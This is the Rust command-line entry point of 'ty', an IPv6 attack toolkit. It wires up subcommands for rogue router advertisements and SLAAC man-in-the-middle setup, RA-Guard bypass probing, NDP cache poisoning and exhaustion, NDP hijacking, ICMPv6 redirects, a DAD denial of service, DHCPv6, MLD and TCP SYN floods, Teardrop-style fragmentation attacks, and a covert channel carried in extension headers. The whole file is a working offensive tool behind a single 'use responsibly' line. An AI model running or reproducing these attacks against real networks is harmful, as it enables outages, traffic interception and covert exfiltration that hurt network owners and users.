//! ty — IPv6 Attack Toolkit, 2026 edition.
//!
//! Rust async/await frontend over the classic C core library (libty).
//! C tools in attack/ fake/ fuzz/ are still built separately via Makefile.

mod engine;
mod ffi;
mod tests;

use std::sync::Arc;
use std::time::Duration;

use anyhow::Result;
use clap::{Parser, Subcommand};
use tracing_subscriber::EnvFilter;

use engine::analyze::analyze_network;
use engine::attack::{
    FakeSlaacConfig, NdpExhaustConfig, NdpPoisonConfig, RaGuardTestConfig, fake_slaac, flood_ndp,
    poison_ndp, raguard_bypass_test,
};
use engine::covert::{CovertChannel, CovertRecvConfig, CovertSendConfig, covert_recv, covert_send};
use engine::discover::alive_scan;
use engine::flood_extra::{
    FragConfig, FragMode, Mld2Config, TcpSynConfig, flood_frag, flood_mld2, flood_tcp_syn,
};
use engine::intercept::{
    DadDosConfig, FakeMldQuerierConfig, ParasiteConfig, RedirectConfig, dad_dos, fake_mld_querier,
    parasite6, redirect6,
};
use engine::probe::{enum_addrs, scan_ports};
use engine::sender::{
    AdvertiseConfig, Dhcp6Config, FloodConfig, MldConfig, RsConfig, SolicitateConfig, TooBigConfig,
    flood_advertise, flood_dhcp6, flood_mld, flood_router, flood_rs, flood_solicitate,
    flood_toobig,
};
use engine::sniff::{dump_dhcp6, dump_routers};
use engine::stats::Stats;

// ── Ctrl-C ────────────────────────────────────────────────────────────────────

async fn shutdown_signal() {
    tokio::signal::ctrl_c()
        .await
        .expect("failed to install Ctrl-C handler");
}

// ── CLI ───────────────────────────────────────────────────────────────────────

#[derive(Parser)]
#[command(
    name = "ty",
    version = "0.2.0",
    about = "ty — IPv6 Attack Toolkit 2026 | async Rust + C engine",
    long_about = "\
ty is an IPv6 network security toolkit.\n\
Use responsibly and only on networks you own or have explicit permission to test.\n\
\n\
Quick start:\n\
  ty analyze    -i eth0                   # passive recon, get attack recommendations\n\
  ty fake-slaac -i eth0 --prefix 2001:db8:dead:beef\n\
  ty raguard-test -i eth0                 # probe RA-Guard bypass techniques\n\
  ty flood-router -i eth0 -r 100\n\
"
)]
struct Cli {
    /// Enable debug output (-v = debug, -vv = trace)
    #[arg(short, long, action = clap::ArgAction::Count, global = true)]
    verbose: u8,

    /// Stop flood after N seconds (0 = no limit)
    #[arg(long, global = true, default_value_t = 0)]
    stop_after_secs: u64,

    #[command(subcommand)]
    command: Commands,
}

#[derive(Subcommand)]
enum Commands {
    // ── Reconnaissance ────────────────────────────────────────────────────────
    /// Passively analyze the network and get attack recommendations
    Analyze {
        #[arg(short = 'i', long)]
        interface: String,
        /// Capture window in seconds
        #[arg(short = 'd', long, default_value_t = 60)]
        duration: u64,
        /// Output as JSON
        #[arg(short = 'j', long)]
        json: bool,
    },

    /// Check which IPv6 addresses respond to ping6
    AliveCheck {
        #[arg(short = 'i', long)]
        interface: String,
        #[arg(short = 't', long, required = true, num_args = 1..)]
        targets: Vec<String>,
        #[arg(short = 'c', long, default_value_t = 8)]
        concurrency: usize,
        #[arg(long, default_value_t = 1000)]
        timeout_ms: u64,
    },

    /// TCP port scan against an IPv6 target
    ScanPorts {
        #[arg(short = 'i', long)]
        interface: String,
        #[arg(short = 't', long)]
        target: String,
        #[arg(short = 'p', long, required = true, num_args = 1..)]
        ports: Vec<u16>,
        #[arg(short = 'c', long, default_value_t = 64)]
        concurrency: usize,
        #[arg(long, default_value_t = 2000)]
        timeout_ms: u64,
        #[arg(short = 'j', long)]
        json: bool,
    },

    /// EUI-64 address enumeration under a /64 prefix
    EnumAddrs {
        #[arg(short = 'i', long)]
        interface: String,
        #[arg(short = 'p', long)]
        prefix: String,
        #[arg(short = 'c', long, default_value_t = 16)]
        concurrency: usize,
        #[arg(long, default_value_t = 1000)]
        timeout_ms: u64,
        #[arg(short = 'j', long)]
        json: bool,
    },

    /// Passively capture Router Advertisements
    DumpRouters {
        #[arg(short = 'i', long)]
        interface: String,
        #[arg(short = 'd', long, default_value_t = 30)]
        duration: u64,
        #[arg(short = 'j', long)]
        json: bool,
    },

    /// Passively capture DHCPv6 traffic
    DumpDhcp6 {
        #[arg(short = 'i', long)]
        interface: String,
        #[arg(short = 'd', long, default_value_t = 30)]
        duration: u64,
        #[arg(short = 'j', long)]
        json: bool,
    },

    // ── SLAAC / Routing attacks ───────────────────────────────────────────────
    /// Announce a rogue prefix via RA — forces SLAAC on victims (MITM setup)
    FakeSlaac {
        #[arg(short = 'i', long)]
        interface: String,
        /// IPv6 /64 prefix to advertise (e.g. 2001:db8:dead:beef)
        #[arg(short = 'p', long)]
        prefix: String,
        /// Prefix length (default 64)
        #[arg(long, default_value_t = 64)]
        prefix_len: u8,
        /// Router lifetime in seconds (0 = invalidate existing routes)
        #[arg(long, default_value_t = 1800)]
        lifetime: u32,
        /// Set M flag (tell victims to use DHCPv6 for addresses)
        #[arg(short = 'M', long)]
        managed: bool,
        /// Set O flag (tell victims to use DHCPv6 for options)
        #[arg(short = 'O', long)]
        other: bool,
        /// Advertise as high-preference default gateway
        #[arg(long)]
        default_gw: bool,
        #[arg(short = 'r', long, default_value_t = 1)]
        rate: u64,
        #[arg(short = 'n', long, default_value_t = 0)]
        count: u64,
    },

    /// Flood the network with Router Advertisements (NDP table exhaustion via routers)
    FloodRouter {
        #[arg(short = 'i', long)]
        interface: String,
        #[arg(short = 'r', long, default_value_t = 0)]
        rate: u64,
        #[arg(short = 'n', long, default_value_t = 0)]
        count: u64,
        #[arg(short = 'H', long)]
        hop: bool,
        #[arg(short = 'F', long, default_value_t = 0)]
        frag: u32,
        #[arg(short = 'D', long)]
        dst: bool,
    },

    /// RA-Guard bypass probe — test 5 evasion techniques
    RaguardTest {
        #[arg(short = 'i', long)]
        interface: String,
        /// Send each technique N times
        #[arg(short = 'c', long, default_value_t = 3)]
        count: u32,
        #[arg(short = 'j', long)]
        json: bool,
    },

    // ── NDP attacks ───────────────────────────────────────────────────────────
    /// NDP neighbor-cache exhaustion — fills router NDP table to disrupt forwarding
    FloodNdp {
        #[arg(short = 'i', long)]
        interface: String,
        /// Target router's link-local IPv6
        #[arg(long)]
        router: String,
        /// /64 prefix to generate victim addresses from (default: random GUA)
        #[arg(long)]
        prefix: Option<String>,
        #[arg(short = 'r', long, default_value_t = 0)]
        rate: u64,
        #[arg(short = 'n', long, default_value_t = 0)]
        count: u64,
    },

    /// NDP cache poisoning — send gratuitous NAs to redirect traffic
    PoisonNdp {
        #[arg(short = 'i', long)]
        interface: String,
        /// IPv6 address to impersonate (e.g. the router's link-local)
        #[arg(long)]
        spoof_target: String,
        /// Specific victim to poison (default: broadcast ff02::1)
        #[arg(short = 't', long)]
        victim: Option<String>,
        #[arg(short = 'r', long, default_value_t = 1)]
        rate: u64,
        #[arg(short = 'n', long, default_value_t = 0)]
        count: u64,
    },

    /// Flood network with Neighbor Solicitations
    FloodSolicitate {
        #[arg(short = 'i', long)]
        interface: String,
        #[arg(short = 'r', long, default_value_t = 0)]
        rate: u64,
        #[arg(short = 'n', long, default_value_t = 0)]
        count: u64,
        #[arg(short = 't', long)]
        target: Option<String>,
        #[arg(short = 'a', long)]
        alert: bool,
    },

    /// Flood network with Neighbor Advertisements (Override flag set)
    FloodAdvertise {
        #[arg(short = 'i', long)]
        interface: String,
        #[arg(short = 'r', long, default_value_t = 0)]
        rate: u64,
        #[arg(short = 'n', long, default_value_t = 0)]
        count: u64,
        #[arg(short = 't', long)]
        target: Option<String>,
    },

    // ── DoS floods ────────────────────────────────────────────────────────────
    /// Flood with MLDv1 Report messages (random multicast group per packet)
    FloodMld {
        #[arg(short = 'i', long)]
        interface: String,
        #[arg(short = 'r', long, default_value_t = 0)]
        rate: u64,
        #[arg(short = 'n', long, default_value_t = 0)]
        count: u64,
    },

    /// DHCPv6 Solicit flood — exhausts server address pool
    FloodDhcp6 {
        #[arg(short = 'i', long)]
        interface: String,
        #[arg(short = 'r', long, default_value_t = 0)]
        rate: u64,
        #[arg(short = 'n', long, default_value_t = 0)]
        count: u64,
    },

    /// ICMPv6 Packet Too Big flood — forces MTU reduction on target
    FloodTooBig {
        #[arg(short = 'i', long)]
        interface: String,
        #[arg(short = 'r', long, default_value_t = 0)]
        rate: u64,
        #[arg(short = 'n', long, default_value_t = 0)]
        count: u64,
        #[arg(short = 't', long)]
        target: String,
    },

    /// Router Solicitation flood — triggers unsolicited RAs from routers
    FloodRs {
        #[arg(short = 'i', long)]
        interface: String,
        #[arg(short = 'r', long, default_value_t = 0)]
        rate: u64,
        #[arg(short = 'n', long, default_value_t = 0)]
        count: u64,
    },

    // ── Interception / MITM ───────────────────────────────────────────────────
    /// DAD DoS — block all new IPv6 address assignments (SLAAC/DAD hijack)
    DadDos {
        #[arg(short = 'i', long)]
        interface: String,
        /// Run for N seconds (0 = until Ctrl-C)
        #[arg(short = 'd', long, default_value_t = 0)]
        duration: u64,
    },

    /// Parasite6 — answer all NDP queries with our MAC (full NDP hijack)
    Parasite {
        #[arg(short = 'i', long)]
        interface: String,
        /// Only hijack NDP for this specific target IPv6 (default: all)
        #[arg(short = 't', long)]
        target: Option<String>,
        /// Also respond to Router Solicitations (become a fake router)
        #[arg(long)]
        fake_router: bool,
        #[arg(short = 'd', long, default_value_t = 0)]
        duration: u64,
    },

    /// ICMPv6 Redirect attack — redirect specific traffic through attacker
    Redirect6 {
        #[arg(short = 'i', long)]
        interface: String,
        /// Victim to poison
        #[arg(long)]
        victim: String,
        /// Original destination (traffic victim sends to this address)
        #[arg(long)]
        destination: String,
        /// New gateway (default: our own link-local)
        #[arg(long)]
        new_gateway: Option<String>,
        #[arg(short = 'r', long, default_value_t = 1)]
        rate: u64,
        #[arg(short = 'n', long, default_value_t = 0)]
        count: u64,
    },

    /// Fake MLD Querier — become the authoritative MLD querier on link
    FakeMldQuerier {
        #[arg(short = 'i', long)]
        interface: String,
        /// MLD version: 1 or 2
        #[arg(long, default_value_t = 2)]
        version: u8,
        /// Advertised query interval in seconds
        #[arg(long, default_value_t = 10)]
        query_interval: u8,
        #[arg(short = 'r', long, default_value_t = 1)]
        rate: u64,
        #[arg(short = 'n', long, default_value_t = 0)]
        count: u64,
    },

    // ── Extra floods ──────────────────────────────────────────────────────────
    /// MLDv2 Report flood — modern multicast protocol attack
    FloodMld2 {
        #[arg(short = 'i', long)]
        interface: String,
        #[arg(short = 'r', long, default_value_t = 0)]
        rate: u64,
        #[arg(short = 'n', long, default_value_t = 0)]
        count: u64,
    },

    /// TCP SYN flood over IPv6 with randomised source addresses
    FloodTcpSyn {
        #[arg(short = 'i', long)]
        interface: String,
        #[arg(short = 't', long)]
        target: String,
        /// Target port (0 = random per packet)
        #[arg(short = 'p', long, default_value_t = 80)]
        port: u16,
        /// Randomise source port per packet
        #[arg(long)]
        rand_sport: bool,
        #[arg(short = 'r', long, default_value_t = 0)]
        rate: u64,
        #[arg(short = 'n', long, default_value_t = 0)]
        count: u64,
    },

    /// IPv6 fragmentation attacks (Teardrop6, atomic, tiny)
    FloodFrag {
        #[arg(short = 'i', long)]
        interface: String,
        #[arg(short = 't', long)]
        target: String,
        /// Fragment mode: overlap | atomic | tiny
        #[arg(long, default_value = "overlap")]
        mode: String,
        #[arg(short = 'r', long, default_value_t = 0)]
        rate: u64,
        #[arg(short = 'n', long, default_value_t = 0)]
        count: u64,
    },

    // ── Covert channel ────────────────────────────────────────────────────────
    /// Send a covert message hidden in IPv6 extension header fields
    CovertSend {
        #[arg(short = 'i', long)]
        interface: String,
        #[arg(short = 't', long)]
        target: String,
        /// Message to send
        #[arg(short = 'm', long)]
        message: String,
        /// Channel: hop (Hop-by-Hop) | dst (Destination Opts) | flow | frag
        #[arg(long, default_value = "hop")]
        channel: String,
        /// Packets per second (lower = more stealthy)
        #[arg(short = 'r', long, default_value_t = 5)]
        rate: u64,
    },

    /// Receive a covert message from IPv6 extension headers
    CovertRecv {
        #[arg(short = 'i', long)]
        interface: String,
        /// Filter by source IPv6 (optional)
        #[arg(short = 's', long)]
        source: Option<String>,
        /// Channel to listen on: hop | dst | flow | frag
        #[arg(long, default_value = "hop")]
        channel: String,
        #[arg(short = 'd', long, default_value_t = 60)]
        duration: u64,
    },
}

// ── helpers ───────────────────────────────────────────────────────────────────

fn spawn_printer(stats: Arc<Stats>) -> tokio::task::JoinHandle<()> {
    tokio::spawn(async move {
        let mut interval = tokio::time::interval(Duration::from_secs(1));
        loop {
            interval.tick().await;
            let (sent, errors, elapsed) = stats.snapshot();
            if elapsed > 0.0 {
                eprint!(
                    "\r  sent={sent}  errors={errors}  {:.0} pps  ",
                    sent as f64 / elapsed
                );
            }
        }
    })
}

macro_rules! run_flood {
    ($fut:expr, $stop:expr) => {{
        if $stop > 0 {
            tokio::select! {
                r = $fut              => r,
                _ = shutdown_signal() => Ok(()),
                _ = tokio::time::sleep(Duration::from_secs($stop)) => Ok(()),
            }
        } else {
            tokio::select! {
                r = $fut              => r,
                _ = shutdown_signal() => Ok(()),
            }
        }
    }};
}

fn print_summary(stats: &Stats) {
    let (sent, errors, elapsed) = stats.snapshot();
    eprintln!(
        "Done: sent={sent} errors={errors} elapsed={elapsed:.1}s avg={:.0} pps",
        if elapsed > 0.0 {
            sent as f64 / elapsed
        } else {
            0.0
        }
    );
}

// ── main ──────────────────────────────────────────────────────────────────────

#[tokio::main]
async fn main() -> Result<()> {
    let cli = Cli::parse();

    let level = match cli.verbose {
        0 => "warn",
        1 => "debug",
        _ => "trace",
    };
    tracing_subscriber::fmt()
        .with_env_filter(
            EnvFilter::try_from_default_env().unwrap_or_else(|_| EnvFilter::new(level)),
        )
        .init();

    let stop = cli.stop_after_secs;

    match cli.command {
        // ── Recon ─────────────────────────────────────────────────────────────
        Commands::Analyze {
            interface,
            duration,
            json,
        } => {
            eprintln!("Analyzing {interface} for {duration}s — press Ctrl-C to stop early...");
            let report = tokio::select! {
                r = analyze_network(interface.clone(), duration) => r?,
                _ = shutdown_signal() => {
                    analyze_network(interface, 1).await?
                }
            };
            if json {
                report.print_json();
            } else {
                report.print();
            }
        }

        Commands::AliveCheck {
            interface,
            targets,
            concurrency,
            timeout_ms,
        } => {
            let stats = Stats::new();
            let alive = alive_scan(
                interface,
                targets,
                concurrency,
                timeout_ms,
                Arc::clone(&stats),
            )
            .await?;
            for host in &alive {
                println!("{host}");
            }
            let (sent, errors, _) = stats.snapshot();
            eprintln!("Done: probed={sent} errors={errors} alive={}", alive.len());
        }

        Commands::ScanPorts {
            interface,
            target,
            ports,
            concurrency,
            timeout_ms,
            json,
        } => {
            let stats = Stats::new();
            eprintln!("Scanning {} port(s) on {target}...", ports.len());
            let open = scan_ports(
                interface,
                target,
                ports,
                concurrency,
                timeout_ms,
                Arc::clone(&stats),
                json,
            )
            .await?;
            let (sent, errors, elapsed) = stats.snapshot();
            eprintln!(
                "Done: probed={sent} errors={errors} open={} elapsed={elapsed:.1}s",
                open.len()
            );
        }

        Commands::EnumAddrs {
            interface,
            prefix,
            concurrency,
            timeout_ms,
            json,
        } => {
            let stats = Stats::new();
            eprintln!("Enumerating addresses under {prefix}...");
            let live = enum_addrs(
                interface,
                prefix,
                concurrency,
                timeout_ms,
                Arc::clone(&stats),
                json,
            )
            .await?;
            let (sent, errors, elapsed) = stats.snapshot();
            eprintln!(
                "Done: probed={sent} errors={errors} live={} elapsed={elapsed:.1}s",
                live.len()
            );
        }

        Commands::DumpRouters {
            interface,
            duration,
            json,
        } => {
            eprintln!("Sniffing RAs on {interface} for {duration}s...");
            let routers = dump_routers(interface, duration, json).await?;
            eprintln!("Done: {} router(s) observed.", routers.len());
        }

        Commands::DumpDhcp6 {
            interface,
            duration,
            json,
        } => {
            eprintln!("Sniffing DHCPv6 on {interface} for {duration}s...");
            let events = dump_dhcp6(interface, duration, json).await?;
            eprintln!("Done: {} DHCPv6 packet(s) observed.", events.len());
        }

        // ── SLAAC / Routing ───────────────────────────────────────────────────
        Commands::FakeSlaac {
            interface,
            prefix,
            prefix_len,
            lifetime,
            managed,
            other,
            default_gw,
            rate,
            count,
        } => {
            let cfg = FakeSlaacConfig {
                interface,
                prefix,
                prefix_len,
                lifetime,
                managed,
                other,
                default_gw,
                rate_pps: rate,
                max_packets: count,
            };
            let stats = Stats::new();
            let printer = spawn_printer(Arc::clone(&stats));
            eprintln!("Sending fake SLAAC RAs (Ctrl-C to stop)...");
            let result = run_flood!(fake_slaac(cfg, Arc::clone(&stats)), stop);
            printer.abort();
            eprintln!();
            print_summary(&stats);
            result?;
        }

        Commands::FloodRouter {
            interface,
            rate,
            count,
            hop,
            frag,
            dst,
        } => {
            let cfg = FloodConfig {
                interface,
                rate_pps: rate,
                max_packets: count,
                do_hop: hop,
                do_frag: frag,
                do_dst: dst,
            };
            let stats = Stats::new();
            let printer = spawn_printer(Arc::clone(&stats));
            eprintln!("Starting RA flood (Ctrl-C to stop)...");
            let result = run_flood!(flood_router(cfg, Arc::clone(&stats)), stop);
            printer.abort();
            eprintln!();
            print_summary(&stats);
            result?;
        }

        Commands::RaguardTest {
            interface,
            count,
            json,
        } => {
            let cfg = RaGuardTestConfig { interface, count };
            let stats = Stats::new();
            eprintln!("Testing RA-Guard bypass techniques...");
            let results = raguard_bypass_test(cfg, Arc::clone(&stats)).await?;
            for r in &results {
                if json {
                    println!(
                        r#"{{"technique":"{}","sent":{},"note":"{}"}}"#,
                        r.technique, r.sent, r.note
                    );
                } else {
                    println!("  {:20}  sent={:<5}  {}", r.technique, r.sent, r.note);
                }
            }
            let (sent, errors, _) = stats.snapshot();
            eprintln!("Done: sent={sent} errors={errors}");
        }

        // ── NDP attacks ───────────────────────────────────────────────────────
        Commands::FloodNdp {
            interface,
            router,
            prefix,
            rate,
            count,
        } => {
            let cfg = NdpExhaustConfig {
                interface,
                router,
                prefix,
                rate_pps: rate,
                max_packets: count,
            };
            let stats = Stats::new();
            let printer = spawn_printer(Arc::clone(&stats));
            eprintln!("Starting NDP cache exhaustion (Ctrl-C to stop)...");
            let result = run_flood!(flood_ndp(cfg, Arc::clone(&stats)), stop);
            printer.abort();
            eprintln!();
            print_summary(&stats);
            result?;
        }

        Commands::PoisonNdp {
            interface,
            spoof_target,
            victim,
            rate,
            count,
        } => {
            let cfg = NdpPoisonConfig {
                interface,
                spoof_target,
                victim,
                rate_pps: rate,
                max_packets: count,
            };
            let stats = Stats::new();
            let printer = spawn_printer(Arc::clone(&stats));
            eprintln!("Starting NDP cache poisoning (Ctrl-C to stop)...");
            let result = run_flood!(poison_ndp(cfg, Arc::clone(&stats)), stop);
            printer.abort();
            eprintln!();
            print_summary(&stats);
            result?;
        }

        Commands::FloodSolicitate {
            interface,
            rate,
            count,
            target,
            alert,
        } => {
            let cfg = SolicitateConfig {
                interface,
                rate_pps: rate,
                max_packets: count,
                target,
                do_alert: alert,
            };
            let stats = Stats::new();
            let printer = spawn_printer(Arc::clone(&stats));
            eprintln!("Starting NS flood (Ctrl-C to stop)...");
            let result = run_flood!(flood_solicitate(cfg, Arc::clone(&stats)), stop);
            printer.abort();
            eprintln!();
            print_summary(&stats);
            result?;
        }

        Commands::FloodAdvertise {
            interface,
            rate,
            count,
            target,
        } => {
            let cfg = AdvertiseConfig {
                interface,
                rate_pps: rate,
                max_packets: count,
                target,
            };
            let stats = Stats::new();
            let printer = spawn_printer(Arc::clone(&stats));
            eprintln!("Starting NA flood (Ctrl-C to stop)...");
            let result = run_flood!(flood_advertise(cfg, Arc::clone(&stats)), stop);
            printer.abort();
            eprintln!();
            print_summary(&stats);
            result?;
        }

        // ── DoS floods ────────────────────────────────────────────────────────
        Commands::FloodMld {
            interface,
            rate,
            count,
        } => {
            let cfg = MldConfig {
                interface,
                rate_pps: rate,
                max_packets: count,
            };
            let stats = Stats::new();
            let printer = spawn_printer(Arc::clone(&stats));
            eprintln!("Starting MLD flood (Ctrl-C to stop)...");
            let result = run_flood!(flood_mld(cfg, Arc::clone(&stats)), stop);
            printer.abort();
            eprintln!();
            print_summary(&stats);
            result?;
        }

        Commands::FloodDhcp6 {
            interface,
            rate,
            count,
        } => {
            let cfg = Dhcp6Config {
                interface,
                rate_pps: rate,
                max_packets: count,
            };
            let stats = Stats::new();
            let printer = spawn_printer(Arc::clone(&stats));
            eprintln!("Starting DHCPv6 Solicit flood (Ctrl-C to stop)...");
            let result = run_flood!(flood_dhcp6(cfg, Arc::clone(&stats)), stop);
            printer.abort();
            eprintln!();
            print_summary(&stats);
            result?;
        }

        Commands::FloodTooBig {
            interface,
            rate,
            count,
            target,
        } => {
            let cfg = TooBigConfig {
                interface,
                rate_pps: rate,
                max_packets: count,
                target,
            };
            let stats = Stats::new();
            let printer = spawn_printer(Arc::clone(&stats));
            eprintln!("Starting Packet Too Big flood (Ctrl-C to stop)...");
            let result = run_flood!(flood_toobig(cfg, Arc::clone(&stats)), stop);
            printer.abort();
            eprintln!();
            print_summary(&stats);
            result?;
        }

        Commands::FloodRs {
            interface,
            rate,
            count,
        } => {
            let cfg = RsConfig {
                interface,
                rate_pps: rate,
                max_packets: count,
            };
            let stats = Stats::new();
            let printer = spawn_printer(Arc::clone(&stats));
            eprintln!("Starting RS flood (Ctrl-C to stop)...");
            let result = run_flood!(flood_rs(cfg, Arc::clone(&stats)), stop);
            printer.abort();
            eprintln!();
            print_summary(&stats);
            result?;
        }

        // ── Interception / MITM ───────────────────────────────────────────────
        Commands::DadDos {
            interface,
            duration,
        } => {
            let cfg = DadDosConfig {
                interface: interface.clone(),
                duration_secs: duration,
            };
            let stats = Stats::new();
            let printer = spawn_printer(Arc::clone(&stats));
            eprintln!("Starting DAD DoS on {interface} — blocking new address assignments...");
            eprintln!("WARNING: This prevents any host from getting an IPv6 address via SLAAC.");
            let result = run_flood!(dad_dos(cfg, Arc::clone(&stats)), stop);
            printer.abort();
            eprintln!();
            print_summary(&stats);
            result?;
        }

        Commands::Parasite {
            interface,
            target,
            fake_router,
            duration,
        } => {
            let cfg = ParasiteConfig {
                interface: interface.clone(),
                target,
                fake_router,
                duration_secs: duration,
            };
            let stats = Stats::new();
            let printer = spawn_printer(Arc::clone(&stats));
            let fk = if fake_router { " + fake router" } else { "" };
            eprintln!("Starting Parasite6 on {interface}{fk} — hijacking all NDP queries...");
            eprintln!("TIP: enable forwarding: sysctl -w net.ipv6.conf.all.forwarding=1");
            let result = run_flood!(parasite6(cfg, Arc::clone(&stats)), stop);
            printer.abort();
            eprintln!();
            print_summary(&stats);
            result?;
        }

        Commands::Redirect6 {
            interface,
            victim,
            destination,
            new_gateway,
            rate,
            count,
        } => {
            let cfg = RedirectConfig {
                interface,
                rate_pps: rate,
                max_packets: count,
                victim: victim.clone(),
                destination: destination.clone(),
                new_gateway,
            };
            let stats = Stats::new();
            let printer = spawn_printer(Arc::clone(&stats));
            eprintln!("Sending ICMPv6 Redirects: {victim} → {destination} via attacker...");
            let result = run_flood!(redirect6(cfg, Arc::clone(&stats)), stop);
            printer.abort();
            eprintln!();
            print_summary(&stats);
            result?;
        }

        Commands::FakeMldQuerier {
            interface,
            version,
            query_interval,
            rate,
            count,
        } => {
            let cfg = FakeMldQuerierConfig {
                interface,
                rate_pps: rate,
                max_packets: count,
                version,
                query_interval,
            };
            let stats = Stats::new();
            let printer = spawn_printer(Arc::clone(&stats));
            eprintln!(
                "Becoming fake MLDv{version} querier (fe80::1) — taking over multicast control..."
            );
            let result = run_flood!(fake_mld_querier(cfg, Arc::clone(&stats)), stop);
            printer.abort();
            eprintln!();
            print_summary(&stats);
            result?;
        }

        // ── Extra floods ──────────────────────────────────────────────────────
        Commands::FloodMld2 {
            interface,
            rate,
            count,
        } => {
            let cfg = Mld2Config {
                interface,
                rate_pps: rate,
                max_packets: count,
            };
            let stats = Stats::new();
            let printer = spawn_printer(Arc::clone(&stats));
            eprintln!("Starting MLDv2 Report flood (Ctrl-C to stop)...");
            let result = run_flood!(flood_mld2(cfg, Arc::clone(&stats)), stop);
            printer.abort();
            eprintln!();
            print_summary(&stats);
            result?;
        }

        Commands::FloodTcpSyn {
            interface,
            target,
            port,
            rand_sport,
            rate,
            count,
        } => {
            let cfg = TcpSynConfig {
                interface,
                target: target.clone(),
                rate_pps: rate,
                max_packets: count,
                port,
                rand_sport,
            };
            let stats = Stats::new();
            let printer = spawn_printer(Arc::clone(&stats));
            let pstr = if port == 0 {
                "random".into()
            } else {
                port.to_string()
            };
            eprintln!("Starting TCP SYN flood → {target}:{pstr} (Ctrl-C to stop)...");
            let result = run_flood!(flood_tcp_syn(cfg, Arc::clone(&stats)), stop);
            printer.abort();
            eprintln!();
            print_summary(&stats);
            result?;
        }

        Commands::FloodFrag {
            interface,
            target,
            mode,
            rate,
            count,
        } => {
            let frag_mode = match mode.as_str() {
                "atomic" => FragMode::Atomic,
                "tiny" => FragMode::Tiny,
                _ => FragMode::Overlap,
            };
            let cfg = FragConfig {
                interface,
                target: target.clone(),
                rate_pps: rate,
                max_packets: count,
                mode: frag_mode,
            };
            let stats = Stats::new();
            let printer = spawn_printer(Arc::clone(&stats));
            eprintln!("Starting fragmentation attack ({mode}) → {target}...");
            let result = run_flood!(flood_frag(cfg, Arc::clone(&stats)), stop);
            printer.abort();
            eprintln!();
            print_summary(&stats);
            result?;
        }

        // ── Covert channel ────────────────────────────────────────────────────
        Commands::CovertSend {
            interface,
            target,
            message,
            channel,
            rate,
        } => {
            let ch = CovertChannel::from_str(&channel);
            let cfg = CovertSendConfig {
                interface,
                target,
                message,
                channel: ch,
                rate_pps: rate,
            };
            let stats = Stats::new();
            covert_send(cfg, Arc::clone(&stats)).await?;
        }

        Commands::CovertRecv {
            interface,
            source,
            channel,
            duration,
        } => {
            let ch = CovertChannel::from_str(&channel);
            let cfg = CovertRecvConfig {
                interface,
                source,
                channel: ch,
                duration_secs: duration,
            };
            let stats = Stats::new();
            let msg = tokio::select! {
                r = covert_recv(cfg, Arc::clone(&stats)) => r?,
                _ = shutdown_signal() => "interrupted".into(),
            };
            println!("{msg}");
        }
    }

    Ok(())
}
